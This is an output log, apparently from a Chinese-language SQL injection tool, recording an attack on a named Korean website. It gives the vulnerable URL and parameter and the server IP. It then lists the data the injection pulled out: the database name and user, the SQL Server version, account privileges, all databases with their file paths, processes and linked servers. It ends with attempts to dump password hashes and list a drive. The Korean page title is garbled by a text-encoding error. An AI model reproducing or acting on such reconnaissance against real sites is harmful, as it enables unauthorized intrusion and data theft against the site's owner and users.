@@ -1,0 +1,106 @@
+■漏洞信息:============================================================
+ ·URL:http://www.creation.or.kr/library/itemview.asp?orderby_1=editdate%20desc&isSearch=1&no=4140
+ ·页面标题：绢恫 扁刀背 措切甸篮 抗荐丛焊促 促扩阑 歹 荤尔茄促.  (Some Christian Colleges Love Darwin More Than Jesus) [茄惫芒炼苞切雀]
+ ·参数:orderby_1=editdate%20desc&isSearch=1&no=4140
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:218.38.12.5
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 05:28:19 GMT
+Server: WWW Server/1.1
+Pragma: no-cache
+cache-control: private
+Pragma: no-cache
+cache-control: private
+Content-Length: 73110
+Content-Type: text/html
+Expires: Sun, 03 Apr 2011 05:28:18 GMT
+Set-Cookie: ASPSESSIONIDQABCDBAC=JNALODGBDPKHJINLFABHKBFM; path=/
+Cache-control: no-cache
+
+
+
+■数据库信息:============================================================
+- 数据库名：kacr20080829
+- 用户名：kacr2008
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：DOMPLE5
+- 服务名：MSSQLSERVER
+- 系统用户名：kacr2008
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+amst	C:\Program Files\Microsoft SQL Server\MSSQL\data\amst_Data.MDF	
+amst20071201	C:\Program Files\Microsoft SQL Server\MSSQL\data\amst20071201.mdf	
+amst20071231	C:\Program Files\Microsoft SQL Server\MSSQL\data\amst20071231.mdf	
+empire	C:\Program Files\Microsoft SQL Server\MSSQL\data\empire_Data.MDF	
+empire20080828	C:\Program Files\Microsoft SQL Server\MSSQL\data\empire20080828.mdf	
+empire20080901	C:\Program Files\Microsoft SQL Server\MSSQL\data\empire20080901.mdf	
+empire20080908	C:\Program Files\Microsoft SQL Server\MSSQL\data\empire20080908.mdf	
+itsoc	C:\Program Files\Microsoft SQL Server\MSSQL\data\itsoc_Data.MDF	
+kacr2008	E:\Database\kacr2008_Data.MDF	
+kacr20080829	E:\Database\kacr20080829.mdf	
+kacr20100820	E:\Database\kacr20100820.mdf	
+kacr20100824	E:\Database\kacr20100824.mdf	
+kibi2008	E:\Database\kibi2008_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+nanost	C:\Program Files\Microsoft SQL Server\MSSQL\data\nanost_Data.MDF	
+nextop	C:\Program Files\Microsoft SQL Server\MSSQL\data\nextop_Data.MDF	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+teacher2008	E:\Database\teacher2008_Data.MDF	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+ucn	C:\Program Files\Microsoft SQL Server\MSSQL\data\ucn_Data.MDF	
+uz2008	E:\Database\uz2008_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	DOMPLE5	2184	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	DOMPLE5	2184	AWAITING COMMAND	SYSTEM	
+Microsoft㈢ Windows㈢ Operating System	sleeping	DOMPLE5	308	AWAITING COMMAND		
+Microsoft㈢ Windows㈢ Operating System	sleeping	DOMPLE5	308	AWAITING COMMAND		
+Microsoft㈢ Windows㈢ Operating System	sleeping	DOMPLE5	308	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+DOMPLE5	SQL Server	SQLOLEDB	DOMPLE5		DOMPLE5	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
